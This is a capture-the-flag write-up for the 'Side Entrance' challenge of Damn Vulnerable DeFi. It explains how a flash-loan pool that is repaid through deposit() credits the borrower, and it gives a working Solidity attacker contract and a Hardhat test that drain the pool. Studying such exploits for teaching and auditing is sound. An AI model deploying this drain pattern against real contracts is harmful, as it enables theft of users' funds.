# Damn Vulnerable Defi: 4. Side Entrance

> A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time. This very simple lending pool has 1000 ETH in balance already, and is
> offering free flash loans using the deposited ETH to promote their system. You must take all ETH from the lending pool.

**Objective of CTF:**

- Steal all ETH from the pool.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
  function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
  using Address for address payable;

  mapping(address => uint256) private balances;

  function deposit() external payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
  }

  function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= amount, "Not enough ETH in balance");

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
  }
}
```

## The Attack

Something looks familiar here: remember in a previous challenge there were two different sources of truth regarding the balance? Here, we have such a problem.

While the pool keeps track of balances of everyone via the `balances` mapping, it is not keeping track of it's own balance in that way! Instead, it is simply using `address(this).balance`. That balance would be the sum of all values under `balances` mapping.

This would be acceptable in the sense that the pool has to know how much total funds there is within, however using that logic within the pool comes with a problem.

See, if a borrowed flash loan is deposited immediately to the contract via `deposit` function, the contract balance would not drop but now all those funds will look as if they belong to the borrower!

## Proof of Concept

Our attacker contract is as follows:

```solidity
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
  SideEntranceLenderPool immutable pool;

  constructor(address target) {
    pool = SideEntranceLenderPool(target);
  }

  function execute() external payable override {
    pool.deposit{value: msg.value}();
  }

  function pwn() external {
    // flash loan the entire pool
    pool.flashLoan(address(pool).balance);
    // this will execute the function above, depositing all that as if your own funds
    // then, withdraw them back
    pool.withdraw();
    // finally, transfer these back to yourself
    payable(msg.sender).transfer(address(this).balance);
  }

  // required to receive ether
  receive() external payable {}
}
```

The Hardhat test is as follows:

```ts
describe('Damn Vulnerable Defi 4: Side Entrance', () => {
  // accounts
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  // contracts
  let pool: SideEntranceLenderPool;

  // constants
  const ETHER_IN_POOL = ethers.utils.parseEther('1000');
  let attackerInitialBalance: BigNumber;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    pool = await ethers.getContractFactory('SideEntranceLenderPool', owner).then(f => f.deploy());
    attackerInitialBalance = await ethers.provider.getBalance(attacker.address);

    // owner puts some ether in the pool
    await pool.deposit({value: ETHER_IN_POOL});

    expect(await ethers.provider.getBalance(pool.address)).to.equal(ETHER_IN_POOL);
  });

  it('should drain funds from the pool', async () => {
    const attackerContract = await ethers
      .getContractFactory('SideEntranceAttacker', owner)
      .then(f => f.deploy(pool.address));
    await attackerContract.connect(attacker).pwn();
  });

  after(async () => {
    expect(await ethers.provider.getBalance(pool.address)).to.be.equal('0');

    // we are'nt checking exactly how much is the final balance of the attacker,
    // because it'll depend on how much gas the attacker spends in the attack
    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
    const attackerNewBalance = await ethers.provider.getBalance(attacker.address);
    expect(attackerNewBalance.gt(attackerInitialBalance)).to.be.true;
  });
});
```
